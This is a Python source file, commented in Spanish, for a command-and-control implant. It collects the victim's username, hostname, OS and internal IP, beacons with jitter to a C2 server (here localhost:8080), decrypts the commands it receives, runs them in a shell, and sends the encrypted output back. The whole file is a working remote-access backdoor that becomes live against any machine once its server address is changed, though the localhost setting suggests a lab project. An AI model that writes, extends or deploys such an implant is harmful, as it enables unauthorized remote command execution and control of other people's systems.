import asyncio, aiohttp, random, os, platform, subprocess, socket, cipher

# Configuración de red del Servidor C2
C2_URL = "http://localhost:8080"
INTERVALO_BEACON = 5
JITTER_PORCENTAJE = 0.2

def get_system_info():
    try:
        name = os.getlogin() + "@" + platform.node()
    except Exception:
        name = "UnknownAgent@" + platform.node()

    os_type = f"{platform.system()} {platform.release()}"

    # Obtener IP interna de forma segura
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        ip = "127.0.0.1"

    return name, ip, os_type

async def execute_system_command(command: str) -> str:
    """Executa un comando de forma asíncrona sin bloquear el bucle de red."""
    try:
        # Ejecución asíncrona nativa usando el subsistema de asyncio
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        stdout, stderr = await process.communicate()
        
        output = stdout.decode(errors='ignore') if stdout else ""
        if stderr:
            output += f"\n[ERROR]: {stderr.decode(errors='ignore')}"
            
        if not output.strip():
            output = "[+] Comando ejecutado con éxito (Sin salida de texto)."
        return output
        
    except Exception as e:
        return f"[!] Fallo crítico al ejecutar el comando: {str(e)}"

async def main():
    agent_name, agent_ip, agent_os = get_system_info()
    print(f"[*] Iniciando Agente C2: {agent_name}")
    print(f"[*] Conectando a {C2_URL} cada {INTERVALO_BEACON} segundos...")

    timeout_config = aiohttp.ClientTimeout(total=6)

    async with aiohttp.ClientSession(timeout=timeout_config) as session:
        while True:
            command = None
            try:
                # 1. Enviar el BEACON de forma asíncrona
                params = {"name": agent_name, "ip": agent_ip, "os_type": agent_os}
                async with session.get(f"{C2_URL}/api/beacon", params=params) as response:
                    
                    if response.status == 200:
                        encrypted_response = await response.json()

                        if "ciphertext" in encrypted_response:
                            # Descifrado empleando tu módulo externo
                            data = cipher.decrypt_data(encrypted_response, agent_name=agent_name)
                            command = data.get("command")

                        # 2. Si se recibe un comando, se ejecuta sin congelar la comunicación
                        if command:
                            print(f"[+] Comando recibido: {command}")
                            output = await execute_system_command(command)

                            raw_payload = {"name": agent_name, "result": output}
                            encrypted_payload = cipher.encrypt_data(raw_payload, agent_name=agent_name)

                            url_resultado = f"{C2_URL}/api/result?name={agent_name}"

                            # 3. Reportar los resultados devueltos por el proceso
                            async with session.post(url_resultado, json=encrypted_payload) as post_resp:
                                if post_resp.status == 200:
                                    print("[*] Resultado enviado exitosamente a la GUI.")
                                else:
                                    print(f"[!] El servidor respondió con estado: {post_resp.status}")

            except aiohttp.ClientConnectorError:
                print("[!] Servidor C2 offline o inaccesible. Reintentando...")
            except asyncio.TimeoutError:
                print("[!] Tiempo de espera agotado en la comunicación. Reintentando...")
            except Exception as e:
                print(f"[!] Error inesperado en el bucle del agente: {e}")

            # Calcular variación aleatoria (Jitter) para suavizar la carga del servidor
            actual_sleep = INTERVALO_BEACON + random.uniform(-INTERVALO_BEACON * JITTER_PORCENTAJE, INTERVALO_BEACON * JITTER_PORCENTAJE)
            await asyncio.sleep(max(1, actual_sleep))

if __name__ == "__main__":
    asyncio.run(main())